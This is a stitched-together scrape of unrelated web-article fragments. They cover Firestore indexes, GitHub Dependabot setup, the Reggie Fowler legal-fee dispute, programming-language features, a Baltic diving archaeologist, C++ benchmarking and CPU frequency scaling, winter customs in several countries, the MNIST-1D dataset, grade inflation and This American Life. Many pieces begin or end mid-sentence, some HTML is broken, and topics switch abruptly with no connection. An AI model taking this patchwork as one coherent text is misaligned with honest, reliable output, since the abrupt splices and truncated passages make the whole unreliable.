<p>As the name suggests, <code>single-field indexes</code> are indexes made of a single field. Firestore automatically creates <code>single-field indexes</code> for all the fields in a document, so we don’t have to worry about creating these ourselves.</p>

<p>As opposed to <code>single-field indexes</code>, <code>composite indexes</code> are not created automatically. These are indexes formed by more than one field and need to be defined before they can be used.</p>



<p>This article scratched the surface of what can be done with <code>Firestore</code>. There are many things about querying that I didn’t cover, as well as other interesting topics like transactions and arrays. I’m planning on using it in a project, so hopefully I’ll be writing about these topics in the future.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Integrating security as a part of application development is desirable, but it's often forgotten or dismissed in practice. Dependabot is a Github feature that will help you keep all your dependencies invulnerable and up-to-date, and you can enable it in just a few clicks!</p>
</section><article><section><p>I've often been told that integrating security as a role and shared responsibility in application development is important. Yet, in my experience, security is frequently given a low priority by developers. Progress is primarily estimated by looking at an application's new features, and security measures are considered invasive and complicating to our day-to-day-work. Luckily, there are tools that requires little effort to increase our focus on security, such as Github's Dependabot  </p>
<h2>What is Dependabot?</h2>
<p>Simply put, Dependabot is a tool designated to keep dependencies secure and up-to-date. How it works can be summarized in the following three steps:</p>
<ol>
<li>Dependabot scans your dependency files for outdated or insecure dependencies.</li>
<li>Dependabot creates pull requests for dependencies that need an update.</li>
<li>You review, test and merge Dependabot’s changes.</li>
</ol>
<p>Following Github's acquisition of Dependabot in May 2019, the feature was added natively to Github. With only a few clicks, Dependabot can easily be enabled from the Github dashboard, and help you keep your application’s dependencies up-to-date.</p>
<h2>Getting started</h2>
<p>Enough background information, let us talk about how to get started. Github's security settings can be configured for an <a href="https://docs.github.com/en/free-pro-team@latest/github/setting-up-and-managing-organizations-and-teams/managing-security-and-analysis-settings-for-your-organization">entire organization</a>, applying to all of the organization’s repositories, or it can be configured <a href="https://docs.github.com/en/free-pro-team@latest/github/administering-a-repository/managing-security-and-analysis-settings-for-your-repository">per repository</a>. Which is the better option depends on your context. If you are the owner of your organization and it is desirable to enable the security features across all of its repositories, obviously it would be less time consuming to configure this on the organization level, rather than for each repository individually. However, if you are a part of a large organization with lots of teams and projects, enabling Dependabot on the repository level might be the only option.</p>
<p>In this example, we will enable Dependabot on a single repository. In your repository, there should be a button titled “Security”. Note that the security option is only visible to administrators, hence it will not be visible if you don't have the admin role in the repository. </p>
<p><img src="https://i.ibb.co/kScW0pN/screenshot-2020-11-21-at-18-06-01-1.png" alt="To enable Dependabot, click on the &quot;Security&quot; button."></p>
<p>In the security overview, there is a row titled “Dependabot alerts”. If not already activated, there should be a button to “Enable Dependabot alerts”. Click it. You should now have three options that you can enable:</p>
<ul>
<li>Dependency graph</li>
<li>Dependabot alerts</li>
<li>Dependabot security updates</li>
</ul>
<h3>Dependency graph</h3>
<p>The dependency graph is a summary of the manifest and lock files stored in a repository. Enabling this feature is a prerequisite for the other options, as Dependabot requires access to the dependency graph in order to create alerts and updates.</p>
<h3>Dependabot alerts</h3>
<p>The alerts allows Dependabot to notify you when it finds a weakness. This is probably the key feature that you are here for. When activated, the number of unresolved alerts is highlighted in the "Security" button that we previously clicked. On the security tab, the alerts highlighting currently outdated dependencies are listed. By clicking on an alert, you will find more details on it, such as a description of the vulnerability and in what version of the dependency it was patched.</p>
<p><img src="https://i.ibb.co/VMrM5Kh/screenshot-2020-11-16-at-19-59-16.png" alt="Security: Dependabot alerts" title="Unresolved Dependabot alerts are listed in the repository."></p>
<h3>Dependabot security updates</h3>
<p>By enabling the third option, the security updates, whenever a vulnerable dependency is discovered, Dependabot will try to fix it. If it is possible to upgrade the vulnerable dependency without disrupting the dependency graph of the repository, Dependabot will generate a pull request bringing the dependency up-to-date. The pull request is given a compatibility score indicating whether the update could cause breaking changes. The number is based on the percentage of tests in public repositories that passed when performing the same update.</p>
<p><img src="https://i.ibb.co/2vr3GBb/dependabot-pull-request.png" alt="Example pull request generated by Dependabot" title="A pull request generated by Dependabot"></p>
<p>Unfortunately, in my experience working with Dependabot, more often than not, it is unable to generate pull requests. This is often because the source of the vulnerability is an indirect or transitive dependency. The Dependabot documentation states that <em>“(...) security updates are triggered only for dependencies that are specified in a manifest or lock file. Dependabot is unable to update an indirect or transitive dependency that is not explicitly defined.”.</em> This means that even though Dependabot is able to perform some automatic updates, you should expect to perform most of the updates yourself - for now.</p>
<p>Even though Dependabot is unable to perform automated dependency updates most of the time, I would recommend enabling the feature. Occasionally it <em>will</em> be able to create the pull request for you, and you'll have saved yourself a couple of minutes that you can spend on something else.</p>
<p><img src="https://i.ibb.co/xXLhGLr/dependabot-pr-error.png" alt="Error message: Dependabot cannot update to the required version" title="More often than not, Dependabot is unable to generate a pull request"></p>
<p>If you already have established an effective process to update your project's dependencies, Dependabot might not be able to help you. Otherwise, you should definitely give it a try. It's free, it takes minimal effort to set up and - no matter how you use it - it's a better option than not monitoring your dependencies in any way.</p></section></article></div>]]>

<p>Fowler’s lawyers <a href="https://amycastor.com/2020/11/12/reginald-fowlers-lawyers-want-to-quit-did-he-neglect-to-pay-them/">want to drop out of the case</a> due to nonpayment, but they need to get permission from the court first.&nbsp;</p>



<p><a href="https://amycastor.com/2020/11/24/reggie-fowler-hoodwinks-his-own-defense-team/">Last we left off</a>, U.S. District Judge Andrew Carter ordered attorneys at law firm Hogan Lovells—also representing defense lawyer Scott Rosenblum at Rosenblum Schwartz &amp; Fry—to file three versions of a sealed letter dated Nov. 18.</p>



<p>The public version—redacting what should not be revealed to the government or the public—discloses more details on the lawyers’ frustrations with a client who perpetually strings them along.&nbsp;</p>



<p>Hogan Lovells attorneys James McGovern and Michael Hefter initially asked for a $25,000 retainer in late 2018 when they first met with their client. Fowler only ever paid the retainer, and two years later, he now owes them $600,000.</p>



<p>His defense team believed all the stories he told them that he was swimming in money, so they weren’t too concerned—at first.</p>



<p>“From the very inception of this matter, we have been led to believe that Mr. Fowler is a high net worth individual with substantial assets, which would allow him to pay his legal bills with little hardship,” the lawyers said in their letter to the judge. </p>



<p>Hogan Lovells started working with Fowler on October 18, 2018. They had their first meeting with him on Nov. 8, 2018, around the time Fowler was initially contacted by the FBI. </p>



<p>“When we agreed to represent Mr. Fowler, it was our understanding that he had been targeted by cryptocurrency businessmen seeking to take advantage of Mr. Fowler’s personal balance sheet as a means of transacting cryptocurrency transactions without drawing the attention of bank compliance officers or regulators,” they said. </p>



<p>Fowler was later arrested in Chandler, Arizona, on<a href="https://www.justice.gov/usao-sdny/pr/arizona-man-and-israeli-woman-charged-connection-providing-shadow-banking-services"> </a>April 30, 2019. (<a href="https://www.justice.gov/usao-sdny/pr/arizona-man-and-israeli-woman-charged-connection-providing-shadow-banking-services">DoJ press release and indictment</a>.)</p>



<p>After his release in May <a href="https://amycastor.com/2019/05/11/reginald-fowler-man-at-center-of-cryptocurrency-scheme-out-on-5-million-bail/">on $5 million bail</a>, Fowler hired Scott Rosenblum to join the defense team. Rosenblum asked for a $275,000 retainer and an additional $85,000 per week retainer, if the case went to trial.&nbsp;Rosenblum received a partial retainer of $100,000, which Hogan Lovells notes that Fowler paid “while he had several unpaid, overdue invoices for legal services issued by Hogan Lovells.”&nbsp;</p>



<p>Additionally, Fowler paid another lawyer (unnamed) in Portugal in full for her services. He also paid international law firm Reed Smith LLP for&nbsp;services rendered in 2018.</p>



<p>“The fact that other attorneys had received payments from Mr. Fowler for their services led us reasonably to believe that Mr. Fowler’s representations to us that he would pay our bills was truthful,” the lawyers said.</p>



<p>In the second half of 2019, the lawyers were diligent about contacting Fowler for money. Each time they reached out, he told them payment was imminent and that “transactions or business deals that would fund the payment of our fees were in process”—but he never paid him.&nbsp;</p>



<p>In February, following a plea bargain that went awry and a superseding indictment, the defense team realized the case would likely go to trial, requiring a substantial amount of work, and still no check from their client. </p>



<p>Fowler has ample funds, they said, including “$10 million in real estate that is unencumbered and could have been liquidated or monetized at any point during the past two years.” His refusal to pay, the lawyers added, has “led to a breakdown in the attorney-client relationship.”</p>



<p>The government has till Dec. 8 to respond and replies are due Dec. 11.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main id="main-content"><article><div><section><p>This is an opinionated post. Consider yourself warned. You will probably disagree with at least some of it, and that is completely fine. The important part is the thought process – don’t just read through it and agree or disagree, think about <em>what</em> you agree or disagree with and <em>why</em>. Becoming aware of these things is valuable: once you become aware of why you dislike something, you can start doing something about it.</p>
</section><article><section><p>Over the years, I have noticed there is a small set of features I value more than others in programming languages. These features allow me to express myself in a concise and clear manner, makes my code more readable, and minimizes the amounts of errors I make. They are not "magical" in any way. Far from it. Rather, they are more.. fundamental aspects of the progamming language itself. Let’s dive in!</p>
<h2>Expressive type system</h2>
<p>Types help me reason. Explicitly typed code communicates intent better, and is easier to navigate without losing context completely. Type systems comes in a variety of flavors, ranging from the most simple ones to more advanced systems with gradual typing, dependent types, type classes, and so on. Although I personally prefer more advanced ones, I believe this is more of a subjective topic. And of less importance, really. The main benefit of type systems exists in even the simplest ones: increased safety and readability. Remember: the compiler is your friend – the more it can verify, the better!</p>
<h2>Type inference</h2>
<p>I was a bit unsure if this point had its place in this blog post. On one hand, I feel its more of a convenience feature than strictly neccessary. On the other, an overly chatty and boilerplaty type system can cause more harm than good –&nbsp;if your business logic drowns in types, it’s too far in the wrong direction. Java, around the 1.5 era, is an example of this. In addition, type inference itself is a a double-egded sword. If the compiler inferes a different type than what you would have thought, it can be quite hard to spot where the actual error is. This is the reason some languages and communities define best practices around type inference, like being explicit in function signatures. Anyway. When I find that perfect spot between explicit types and inferred types, it just makes me really happy.</p>
<h2>Algebraic data types</h2>
<p>I remember the first time I enountered sum types. My first response was «but.. Isn’t this just some kind of enums?». I can kind of see why I thought that, but I feel this is a limiting way of approaching them. Where enums helps me limit valid values, algebraic data types is so much more. It enables me to model my domain and state in a precise and correct manner, and makes illegal states «impossible». This didn’t really become clear to me until I went back to Java. I find modelling without them cumbersome and hard, and sometimes even end up in situations where I can’t avoid impossible states. Few things are more confusing than finding the comment «this can’t happen» in a branch of someones code.</p>
<h2>First class functions</h2>
<p>I don’t even understand why this is subject to discussion anymore, but functions should be treated just like any other value <sup id="fnref-1"><a href="#fn-1">1</a></sup> in a programming language. Returning functions and accepting functions as parameters is a fundamental feature to create abstractions and solve problems with composition. This just isn’t up for debate – I would take first class functions over any other feature any day of the week!</p>
<p><sup id="fnref-1"><a href="#fn-1">1</a></sup> – I use the term "value" loosely here. I don’t mean to debate value types, reference types, and pass by value or reference. Those are implementation details. The point is to see what advantages you get when a language treats simple values and functions the same. </p>
<h2>Functional Programming</h2>
<p>Functional programming taught me to value these features. Sure, you will find imperative languages with these features as well, but they never feel like a core feature of the language. Even Java comes with some sort of primitive type inference these days, but it mostly feels tacked onto the language.</p>
<p>With some notable exceptions (looking at you, LISP), these are core features in all functional programming languages I use. They make my day better, so I would think hard before adopting a language without them these days.</p>
<p>Which feature do you miss or disagree with the most?</p></section></article></div></article></main></div></div>]]>

<p>
As an archaeologist, Florian Huber is in the truest sense of the word with all waters. He searched for ancient Mayan antiquities in the flooded caves of the Yucatán, and dived to the bottom of fjords and deep alpine lakes. Again and again, however, the Kiel underwater researcher was drawn to the bottom of the Baltic Sea, where he tracked down wrecks or examined flora and fauna together with biologists.
</p>
<p>
It was here, of all places, that the well-traveled researcher made his most exciting discovery. Huber was actually working with two colleagues in the Geltinger Bucht, not far from Flensburg, in the service of environmental protection. The divers looked for ghost nets, abandoned fishing nets that become deadly traps for marine animals at the bottom.
</p>
<p>
From on board the “Mola Mola”, a nearly eight-meter-long motor catamaran, the researchers systematically scanned the sea floor with sonar. If the system detects a disused network or another object on the ground, the tracking device receives conspicuous sound pulses. The divers then slip into their suits, strap on their compressed air cylinders and drop backwards from the ship’s railing into the cold water to check.

  <div>
    <p>I’ve been spending an unreasonable amount of time trying to understanding performance jitters in a C++ application I’m working on. I have been measuring the time taken to execute a physics update as part of a graphics loop, something like:</p>
<div><pre><code data-lang="cpp"><span>void</span> <span>update</span><span>()</span> <span>{</span>
    <span>// Need to analyze performance of this function:
</span><span></span>    <span>step_physics</span><span>();</span>

    <span>// Regular OpenGL drawing stuff, glBuffer etc
</span><span></span>    <span>draw</span><span>();</span>
<span>}</span>
</code></pre></div>
<p>I’m interested in optimizing the physics step, so I instrument it using <a href="https://en.cppreference.com/w/cpp/chrono"><code>std::chrono</code></a>:</p>
<div><pre><code data-lang="cpp"><span>void</span> <span>update</span><span>()</span> <span>{</span>
    <span>using</span> <span>namespace</span> <span>std</span><span>::</span><span>chrono</span><span>;</span>

    <span>auto</span> <span>start</span> <span>=</span> <span>high_resolution_clock</span><span>::</span><span>now</span><span>();</span>
    <span>step_physics</span><span>();</span>
    <span>duration</span><span>&lt;</span><span>double</span><span>&gt;</span> <span>elapsed</span> <span>=</span> <span>high_resolution_clock</span><span>::</span><span>now</span><span>()</span> <span>-</span> <span>start</span><span>;</span>
    <span>double</span> <span>physics_time</span> <span>=</span> <span>elapsed</span><span>.</span><span>count</span><span>();</span>

    <span>// Regular OpenGL drawing stuff, glBuffer etc
</span><span></span>    <span>draw</span><span>();</span>
<span>}</span>
</code></pre></div>
<p>Here’s what time taken looks like:</p>

        <img src="https://karthikkaranth.me/img/blog/performance-benchmarking-beware-frequency-scaling/time_jitter.png">
    
    
</figure>

<p>That’s a terrifying amount of jitter! Many dead ends and experiments later, I noticed that the performance stabilized when I started <em>drawing more things</em> to understand the problem. Turns out, the jitters were a result of <em>not doing enough work</em> in the draw call!</p>

<p>Operating systems typically employ some form of <a href="https://wiki.archlinux.org/index.php/CPU_frequency_scaling">CPU frequency scaling</a> to save power when the system isn’t doing much work. The default governor on my system would keep the CPU at a low-power low-frequency mode, and dynamically increase it when the system load increases.</p>

<p>My application ran at 60FPS(about 16.67ms per frame). Since the update took much less than that overall, the process would sleep till the next frame. The default CPU governor <a href="https://wiki.archlinux.org/index.php/CPU_frequency_scaling#Scaling_governors">powersave</a> would keep the CPU at a lower frequency because it sees the process mostly sleeping! During the update function however, the frequency would be scaled. This caused massive fluctuations in the recorded benchmarks!</p>

<p>Also, I should note that this was a symptom of improper benchmarking: I knew that the performance was stable if I simply ran the physics updates and didn’t draw anything. :( This entire ordeal was an attempt to understand why drawing would cause such massive differences in performance!</p>

<p>To verify this, I <a href="https://askubuntu.com/a/855744">switched the governor</a> to performance:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="blog">
                    <h2>Different countries</h2>
<p>What do you think when someone says the season's name, Winter? What is the first association that comes to your mind?</p>
<p>Is it snowy mountains and puff jackets that make everyone look like a hulk? Is it the dirt that gets combined with the snow on the sides of the prospects? Is it a nice and hot season that signals the end of a raining season that has been not letting you live in peace?</p>
<p>Is it the Christmas decorations that get put out by business and by the city? Is it the family that you will be able to meet and spend Christmas together? Is it the new year and a fresh start to your goals?</p>
<p>To tell you the truth, this will be different to every individual.</p>
<h2>Russia</h2>
<p>I have been travelling around ever since I was young and I have talked and met both in-person and online many different representatives of different nations. One of the biggest patterns that I saw is that we, as a family, tried to escape Russia every single winter due to the coldness and grimness of people at that time of the year.</p>
<p><img alt="winter in Russia store" src="https://i.gyazo.com/0bb2b6a3d5dfa0453956dcadb24c2e57.jpg"></p>
<p>People in Russia usually associate winter with 3 things:</p>
<ul>
<li>Cold weather that doesn’t let you properly move about and enjoy yourself outside for more than 30 minutes.</li>
<li>New Year’s holidays that last at least 8 days and let everyone drink as much alcohol and catch up on as much sleep as they can. Oh and, by the way, everything an anything is closed.</li>
<li>Constant struggle between the government's ability to clean the roads off snow and the amount of snow that falls. (Usually, the snow starts winning at the start of the winter, but the tractors take back the advantage in January)</li>
</ul>
<p><img alt="winter in Russia Saint Petersburg" src="https://i.gyazo.com/920deaec69bf9478d15bb812127ffd9d.jpg"></p>
<p>All of this is very strongly embedded in the minds of every Russian. That is the definition of what Winter is, and it is also a signal that everyone needs to get ready for at least 6 months of temperature below 2 degree Celsius. It is not ideal, to say the least.</p>
<p>So when you leave Russia in December, after you got to experience that heavy mood, any other country that is not close to Russia is a new perspective on the winter season entirely.</p>
<h2>France</h2>
<p>Let’s take France as an example, especially Côte d'Azur. The weather here is never bellow 0 degrees, except on infrequent occasion. They haven’t had snowfall in the city for at least 10 years. It is always clean here with everyone starting to celebrate Christmas since November. You can also wear a t-shirt outside on some rare days when the sun is particularly active. Well, is that different from what Russians feel? Yes, yes, it is.</p>
<p><img alt="winter in France" src="https://i.gyazo.com/946973cd18e14ba48c2b4f99acbeb8cc.jpg"></p>
<p>So what about the locals? What is winter to them? Mainly it is a Christmas holiday and gathering as many friends and family as possible to catch up. </p>
<p>French people are a very talkative bunch when they ask you how are you; you are not just expected to answer quickly and get on with it, no. You are expected to ask them back and then dive deeper and ask how are their family and work. They talk—a lot.</p>
<p>I don’t mind it, but coronavirus had other plans for them this time. How do you gather every friend and colleague when you are on lockdown? Well, you can’t. So their holiday spirit must be broken right now, and it is felt all around us in the air.</p>
<h2>South Korea</h2>
<p>What about this magical place in Asia called South Korea?</p>
<p><img alt="South Korea during winter" src="https://i.gyazo.com/632b2aa2eb353a7c63311bd27638d148.jpg"></p>
<p>In reality, they don’t celebrate Christmas themselves religiously. They only do it like most of the western holidays. They get a cake, slice it around the close family table and go to sleep. Nothing fancy or special.</p>
<p>But the spirit of the holiday is everywhere at this time of the year. Everything is beautiful and decorated. Mostly for foreigners but also to show off that they know about western holidays as well.</p>
<p>What is their idea of Winter then? It depends… There is a strong Chinese part of the population that can’t wait to celebrate the Lunar year, but there are also others that don’t really care. Others just want winter to be finished as humidity rises, and the temperature drops to around 5 degree Celsius, which is basically the same thing as -20 in Russia.</p>
<p><img alt="winter in South Korean new year" src="https://i.gyazo.com/9ba59d5c9cd4063dbabdf3ff0010548d.jpg"></p>
<p>All in all, every country feels and shows Winter very differently.</p>
<p>Some celebrate it, some hate it and want it to be over. The way you perceive the Winter outside that is the way people in the country will feel for the whole season. So next time you talk to someone on how is the weather, don’t try to say how horrible it is. Look at the positive things, and maybe you can change your own perspective as well.</p>
<p>Be nice. Be the first person you know that is nice around you. You can start the domino effect and hopefully change the whole countries perspective. Wouldn’t be amazing to make so many people’s lives better?</p>
<p>Start now. Get perfect later.</p>

    <p>Constructing the MNIST-1D dataset. As with the original MNIST dataset, the task is to learn to classify the digits 0-9. Unlike the MNIST dataset, which consists of 28x28 images, each of these examples is a one-dimensional sequence of points. To generate an example, we begin with 10 digit templates and then randomly pad, translate, add noise, and transform them as shown above.</p>
  	</div>

<p>By any scientific standard, the Human Genome Project <a href="https://deepblue.lib.umich.edu/handle/2027.42/62798">was enormous</a>: it involved billions of dollars of funding, dozens of institutions, and over a decade of accelerated research. But that was only the tip of the iceberg. Long before the project began, scientists were hard at work assembling the intricate science of human genetics. And most of the time, they were not studying humans. The foundational discoveries in genetics centered on far simpler organisms such as peas, molds, fruit flies, and mice. To this day, biologists use these simpler organisms as genetic “minimal working examples” in order to save time, energy, and money. A well-designed experiment with Drosophilia, such as <a href="https://pubmed.ncbi.nlm.nih.gov/10746727/">Feany and Bender (2000)</a>, can teach us an astonishing amount about humans.</p>

<p>The deep learning analogue of Drosophilia is the MNIST dataset. A large number of deep learning innovations including <a href="https://jmlr.org/papers/v15/srivastava14a.html">dropout</a>, <a href="https://arxiv.org/abs/1412.6980">Adam</a>, <a href="http://yann.lecun.com/exdb/publis/pdf/lecun-89e.pdf">convolutional networks</a>, <a href="https://arxiv.org/abs/1406.2661">generative adversarial networks</a>, and <a href="https://arxiv.org/abs/1312.6114">variational autoencoders</a> began life as MNIST experiments. Once these innovations proved themselves on small-scale experiments, scientists found ways to scale them to larger and more impactful applications.</p>

<p>They key advantage of Drosophilia and MNIST is that they dramatically accelerate the iteration cycle of exploratory research. In the case of Drosophilia, the fly’s life cycle is just a few days long and its nutritional needs are negligible. This makes it much easier to work with than mammals, especially humans. In the case of MNIST, training a strong classifier takes a few dozen lines of code, less than a minute of walltime, and negligible amounts of electricity. This is a stark contrast to state-of-the-art vision, text, and game-playing models which can take months and <a href="https://arxiv.org/abs/2004.08900">hundreds of thousands of dollars</a> of electricity to train.</p>

<p>Yet in spite of its historical significance, MNIST has three notable shortcomings. First, it does a poor job of differentiating between linear, nonlinear, and translation-invariant models. For example, logistic, MLP, and CNN benchmarks obtain 94, 99+, and 99+% accuracy on it. This makes it hard to measure the contribution of a CNN’s spatial priors or to judge the relative effectiveness of different regularization schemes. Second, it is somewhat large for a toy dataset. Each input example is a 784-dimensional vector and thus it takes a non-trivial amount of computation to perform hyperparameter searches or debug a metalearning loop. Third, MNIST is hard to hack. The ideal toy dataset should be procedurally generated so that researchers can smoothly vary parameters such as background noise, translation, and resolution.</p>

<p>In order to address these shortcomings, we propose the MNIST-1D dataset. It is a minimalist, low-memory, and low-compute alternative to MNIST, designed for exploratory deep learning research where rapid iteration is a priority. Training examples are 20 times smaller but they are still better at measuring the difference between 1) linear and nonlinear classifiers and 2) models with and without spatial inductive biases (eg. translation invariance). The dataset is procedurally generated but still permits analogies to real-world digit classification.</p>

Like MNIST, the classifier's objective is to determine which digit is present in the input. Unlike MNIST, each example is a one-dimensional sequence of points. To generate an example, we begin with a digit template and then randomly pad, translate, and transform it.</p>

<h2 id="example-use-cases">Example Use Cases</h2>

<p>In this section we will explore several examples of how MNIST-1D can be used to study core “science of deep learning” phenomena.</p>

<p><strong>Finding lottery tickets.</strong> It is not unusual for deep learning models to have ten or even a hundred times more parameters than necessary. This overparameterization helps training but increases computational overhead. One solution is to progressively prune weights from a model during training so that the final network is just a fraction of its original size. Although this approach works, conventional wisdom holds that sparse networks do not train well from scratch. Recent work by <a href="https://arxiv.org/abs/1803.03635">Frankle &amp; Carbin (2019)</a> challenges this conventional wisdom. The authors report finding sparse subnetworks inside of larger networks that train to equivalent or even higher accuracies. These “lottery ticket” subnetworks can be found through a simple iterative procedure: train a network, prune the smallest weights, and then rewind the remaining weights to their original initializations and retrain.</p>

<p>Since the original paper was published, a multitude of works have sought to explain this phenomenon and then harness it on larger datasets and models. However, very few works have attempted to isolate a “minimal working example” of this effect so as to investigate it more carefully. The figure below shows that the MNIST-1D dataset not only makes this possible, but also enables us to elucidate, via carefully-controlled experiments, some of the reasons for a lottery ticket’s success. Unlike many follow-up experiments on the lottery ticket, this one took just two days of researcher time to produce. The curious reader can also <a href="https://bit.ly/3nCEIaL">reproduce these results</a> in their browser in a few minutes.</p>

  </p>
  <p>Finding and analyzing lottery tickets. In <b>a-b)</b>, we isolate a "minimum viable example" of the effect. Recent work by <a href="https://arxiv.org/abs/1906.02773">Morcos et al (2019)</a> shows that lottery tickets can transfer between datasets. We wanted to determine whether spatial inductive biases played a role. So we performed a series of experiments: in <b>c)</b> we plot the asymptotic performance of a 92% sparse ticket. In <b>d)</b> we reverse all the 1D signals in the dataset, effectively preserving spatial structure but changing the location of individual datapoints. This is analogous to flipping an image upside down. Under this ablation, the lottery ticket continues to win.</p>
</div>

  </p>
  <p><img src="https://greydanus.github.io/assets/scaling-down/lottery_b2.png">
  </p>
    <p>Next, in <b>e)</b> we permute the indices of the 1D signal, effectively removing spatial structure from the dataset. This ablation hurts lottery ticket performance significantly more, suggesting that part of the lottery ticket's performance can be attributed to a spatial inductive bias. Finally, in <b>f)</b> we keep the lottery ticket sparsity structure but initialize its weights with a different random seed. Contrary to results reported in <a href="https://arxiv.org/abs/1803.03635">Frankle &amp; Carbin (2019)</a>, we see that our lottery ticket continues to outperform a dense baseline, aligning well with our hypothesis that the lottery ticket mask has a spatial inductive bias. In <b>g)</b>, we verify our hypothesis by measuring how often unmasked weights are adjacent to one another in the first layer of our model. The lottery ticket has many more adjacent weights than chance would predict, implying a local connectivity structure which helps gives rise to spatial biases.</p>

<p>You can also visualize the actual masks selected via random and lottery pruning:  </p>





<p><strong>Observing deep double descent.</strong> Another intriguing property of neural networks is the “double descent” phenomenon. This phrase refers to a training regime where more data, model parameters, or gradient steps can actually <em>reduce</em> a model’s test accuracy<sup id="fnref:fn1" role="doc-noteref"><a href="#fn:fn1">1</a></sup> <sup id="fnref:fn2" role="doc-noteref"><a href="#fn:fn2">2</a></sup> <sup id="fnref:fn3" role="doc-noteref"><a href="#fn:fn3">3</a></sup> <sup id="fnref:fn4" role="doc-noteref"><a href="#fn:fn4">4</a></sup>. The intuition is that during supervised learning there is an interpolation threshold where the learning procedure, consisting of a model and an optimization algorithm, is just barely able to fit the entire training set. At this threshold there is effectively just one model that can fit the data and this model is very sensitive to label noise and model mis-specification.</p>

<p>Several properties of this effect, such as what factors affect its width and location, are not well understood in the context of deep models. We see the MNIST-1D dataset as a good tool for exploring these properties. In fact, we were able to reproduce the double descent pattern after a few hours of researcher effort. The figure below shows our results for a fully-connected network and a convolutional model. We also observed a nuance that we had not seen mentioned in previous works: when using a mean square error loss, the interpolation threshold lies at \(n * K\) model parameters where \(n\) is the number of training examples and \(K\) is the number of model outputs. But when using a negative log likelihood loss, the interpolation threshold lies at \(n\) model parameters – it does not depend on the number of model outputs. This is an interesting empirical observation that may explain some of the advantage in using a log likelihood loss over a MSE loss on this type of task. You can reproduce these results <a href="https://bit.ly/2UBWWNu">here</a>.</p>

						<p>“<a href="http://www.theatlantic.com/education/archive/2015/01/same-performance-better-grades/384447/">Same Performance, Better Grades: Academic achievement hasn’t improved much, so why are college-goers getting higher GPAs than ever before?</a>” doesn’t cite <a href="http://www.amazon.com/Academically-Adrift-Limited-Learning-Campuses/dp/0226028569?ie=UTF8&amp;tag=thstsst-20&amp;linkCode=as2&amp;camp=1789&amp;creative=390957"><em>Academically Adrift: Limited Learning on College Campuses</em></a>, though it should. Both the article and the book observe that grade inflation is real and doesn’t reflect increased student knowledge. But neither book nor article bring up an obvious question: What incentive does an individual professor have to grade honestly (or, as students might call it, “harshly”)?</p>
<p>When an individual professor grades students harshly, the students give low evaluation scores (which the article does, to its credit, note), but more importantly they can create a lot of extra work in the form of emails to be answered and, to a lesser extent, office hour visits generated. Much of htat work is not rewarding, intellectually or remuneratively, although office hours can be. Professors are rewarded primarily by producing research and in some schools to a lesser extent for getting high student evaluations, and grading honestly is counterproductive for either of those goals; it’s like a professional athlete honing his knitting skills.</p>
<p><a href="https://jakeseliger.com/2017/08/28/igen-jean-m-twenge-the-kids-arent-all-right/">Helicopter parenting</a> may also contribute to student expectations around grades, and administrator expectations that students’s input will be valued in terms of who to hire, fire, and promote. I haven’t experienced helicopter parenting first-hand, but I have heard the stories, and I have heard about grad students and adjuncts going to meetings based on low grades; the message gets disseminated even if it isn’t stated explicitly.</p>
<p>I’ve gotten lots of unhappy emails and, more rarely, calls from students. The perhaps most interesting ones come from students who plagiarized papers but thought I should excuse the plagiarism. In middle or high school perhaps that would be appropriate, but not college, and their efforts take time and mental energy to deal with. If even the plagiarizers want a hearing and elaborate negotiations and second chances, imagine the students who just wrote weak papers!</p>
<p>There’s no check on giving high grades, especially in squishy humanities courses like the ones I teach. The article says “Ultimately, grade inflation has severe consequences,” but then lists extremely un-severe consequences, like difficulty “for employers to vet the caliber of an applicant” (do employers actually do this?) or misleading students, “who often use their grades as benchmarks to help diagnose their strengths and weaknesses.” Some students do that but many don’t. The “severe consequences” paragraph feels like it was invented by a student for a paper.</p>
<p>Finally, the much-ballyhooed shift from tenured faculty to adjuncts means that even small or unjustified complaints can mean the difference between a given adjunct getting a course or not getting a course, if the opportunity is down to two, or a small number, of potential instructors. I’ve not heard of any adjunct, grad student, or instructor getting static for giving overly high grades. Give low grades or run a demanding class, though, and it can and does happen. Many adjunct decide to buckle up for safety’s sake, instead of going wild by not wearing that seatbelt.</p>
<p>Colleges mostly know that the students will pay tuition (or rather, their parents and their loan originators will) if they are happy with the educational product, and professors know they are more likely to keep getting paid if they have fewer student complaints rather than more. Colleges have set up programs that are designed to graduate students with limited skills but real tuition money. <em><a href="https://jakeseliger.com/2014/04/27/paying-for-the-party-elizabeth-armstrong-and-laura-hamilton/">Paying for the Party</a></em> by Elizabeth Armstrong and Laura Hamilton describes the consequences.</p>
<p>Want more serious grades? Provide the incentives to give them. Almost no one wants more serious grades.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span><span>F</span></span>irst broadcast in November 1995, <em>This American Life</em> is the most influential precursor to narrative podcasting as it exists today. Over the last 25 years, the show founded and led by Ira Glass has built a vast network of producers and writers who have set standards across all genres of audio production. Two of the biggest names in the podcasting boom — <em>Serial</em>’s Sarah Koenig and Gimlet Media’s Alex Blumberg — were deeply involved with the show’s golden age. Many other producers from that period: Starlee Kine, Brian Reed, Hillary Frank, Scott Carrier, Jonathan Goldstein, and former intern PJ Vogt, to name just a few, have gone on to create acclaimed podcasts of their own.</p><p>What makes a good <em>This American Life</em> story? The show’s <a href="https://www.thisamericanlife.org/about/submissions" target="_blank" rel="noopener noreferrer">submissions page</a> narrows it down to two principles: “There are characters in some situation, and a conflict,” and “[the] stories raise some bigger question or issue, some universal thing to think about.” But I would argue that the key ingredient is the contributor. The variety of styles on display in <em>This American Life </em>has separated the program from a traditional newsmagazine, whether that be <em>60 Minutes</em> or one found in print. And so, to make a list of the best episodes of <em>This American Life,</em> is to spotlight the work of the many staff and producers who make the show.</p><p>Surveying the following list, two things become apparent. First, episodes 300 to 400 (released from roughly 2006 to 2010) indeed constituted a kind of “golden age” for the show. During this period, production of <em>This American Life</em> moved from Chicago to New York (on account of the show’s <a href="https://www.thisamericanlife.org/node/43664" target="_blank" rel="noopener noreferrer">brief experimentation with television</a>), and the program became a force beyond itself. While much of the show’s first 10 years turned around the show’s home base of Chicago, once in New York, the show went global. It might be that no one takes you seriously until you’ve been at work for a decade, or it might just be that this was the moment Gen X became a silent majority of the culture industry. There was a political dimension to this: as the Bush administration tripped over itself in the wake of Hurricane Katrina, and the follies of the Iraq and Afghan Wars became ever more apparent, <em>This American 